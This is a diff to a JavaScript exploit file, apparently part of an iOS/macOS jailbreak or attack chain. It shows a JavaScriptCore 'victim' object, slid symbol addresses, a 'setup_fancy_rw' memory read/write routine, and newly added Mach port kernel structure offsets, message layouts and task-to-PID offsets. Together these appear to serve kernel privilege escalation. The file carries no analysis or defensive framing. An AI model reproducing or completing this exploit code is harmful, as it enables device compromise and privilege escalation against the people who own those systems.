@@ -18,6 +18,9 @@ var PROT_EXEC = 0x4;
 
 var MAP_PRIVATE = 0x2;
 var MAP_ANON = 0x1000;
+var RTLD_NOW = 2;
+var PAGE_SIZE = 0x1000;
+var O_RDONLY = 0;
 
 var victim = {a: 13.37};
 
@@ -33,7 +36,7 @@ if (0) {
 		 */
 
 		puts = function (){};
-}
+	}
 }
 
 var JSStringCreateWithUTF8CString = 0x239f9d0d;
@@ -46,6 +49,35 @@ var kCFPreferencesAnyUser;
 var kCFPreferencesCurrentHost;
 var kIOMasterPortDefault = NULL;
 var options = {};
+
+var sanity_port = 0;
+var MACH_PORT_RIGHT_RECEIVE = 0x1;
+var MACH_MSG_TYPE_MAKE_SEND = 0x14;
+var MACH_PORT_LIMITS_INFO = 0x1;
+var MACH_PORT_LIMITS_INFO_COUNT = 0x1;
+var kport_size = 0x78;
+var kport_ip_bits4 = 0x0;
+var kport_ip_references4 = 0x4;
+var kport_ip_lock_type4 = 0x10;
+var kport_ip_messages_port_qlimit2 = 0x42;
+var kport_ip_receiver4 = 0x4c;
+var kport_ip_srights4 = 0x70;
+var KERN_SUCCESS = 0;
+var NULL = 0;
+var MACH_PORT_NULL = 0;
+var req_init_port_set = 0x1c;
+var req_head_msgh_bits = 0x0;
+var req_head_msgh_request_port = 0x8;
+var req_head_msgh_reply_port = 0xc;
+var req_head_msgh_id = 0x14;
+var req_msgh_body_msgh_descriptor_count = 0x18;
+var MACH_MSG_OOL_PORTS_DESCRIPTOR = 0x2;
+var req_init_port_set_address = 0x0;
+var req_init_port_set_count = 0x4;
+var MACH_RCV_MSG = 0x2;
+var MACH_MSG_TIMEOUT_NONE = 0;
+var TASK_BSDINFO_OFFSET = 0x200;
+var BSDINFO_PID_OFFSET = 0x8;
 
 function parse_nvram_options() {
 //	read_u32(dlsym(dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW), "kIOMasterPortDefault"));
@@ -98,7 +130,7 @@ function main() {
 	sym_cache["JSObjectGetProperty"] = JSObjectGetProperty + dyld_shc_slide;
 	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;
 
-	prep_shit();
+//	prep_shit();
 
 	setup_fancy_rw();
 
